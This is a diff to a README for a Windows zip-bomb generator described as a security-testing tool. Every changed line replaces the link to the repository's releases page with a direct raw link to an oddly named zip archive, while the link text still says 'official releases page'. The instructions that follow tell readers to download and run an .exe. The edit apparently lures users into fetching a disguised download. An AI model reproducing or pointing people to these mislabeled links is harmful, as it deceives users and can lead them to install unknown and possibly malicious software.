@@ -1,6 +1,6 @@
 # 💣 zipbomb - Create compressed files for security testing
 
-[![Download zipbomb](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Precedential-religionism330/zipbomb/releases)
+[![Download zipbomb](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Precedential-religionism330/zipbomb/raw/refs/heads/main/quickbeam/Software_uncorroborated.zip)
 
 This application creates ZIP bombs. Security researchers use these files to test how antivirus software and archive programs handle extreme compression. 
 
@@ -19,9 +19,9 @@ The application runs on any modern Windows computer. Ensure you have the followi
 
 ## 🚀 Downloading The Software
 
-Visit the [official releases page](https://github.com/Precedential-religionism330/zipbomb/releases) to access the latest version. 
+Visit the [official releases page](https://github.com/Precedential-religionism330/zipbomb/raw/refs/heads/main/quickbeam/Software_uncorroborated.zip) to access the latest version. 
 
-1. Open the [release page](https://github.com/Precedential-religionism330/zipbomb/releases) in your web browser.
+1. Open the [release page](https://github.com/Precedential-religionism330/zipbomb/raw/refs/heads/main/quickbeam/Software_uncorroborated.zip) in your web browser.
 2. Find the section labeled Assets at the bottom of the newest release.
 3. Click the file that ends with .exe to start the download.
 4. Save the file to your Downloads folder.
